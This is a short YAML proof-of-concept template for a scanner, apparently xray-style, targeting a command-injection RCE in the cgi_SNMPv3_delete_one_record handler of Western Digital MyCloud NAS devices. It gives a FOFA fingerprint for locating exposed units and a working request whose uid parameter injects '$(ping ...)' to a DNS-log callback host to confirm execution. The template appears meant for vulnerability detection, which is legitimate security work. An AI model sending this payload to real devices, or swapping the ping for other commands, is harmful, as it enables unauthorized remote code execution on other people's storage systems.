id: poc-yaml-west-nas-cgi-snmpv3-delete-one-record-rce
info:
  name: 西部数码 NAS cgi_SNMPv3_delete_one_record 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  - DNSLOG
  finger: western_digital_mycloud_nas
  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"WDMyCloud")
- method: GET
  path: /cgi-bin/snmp_mgr.cgi?cmd=cgi_SNMPv3_delete_one_record&uid=%24(ping%20{{.domain}})
  expression: status_code == 200 && reverse.Verify()
transport: http
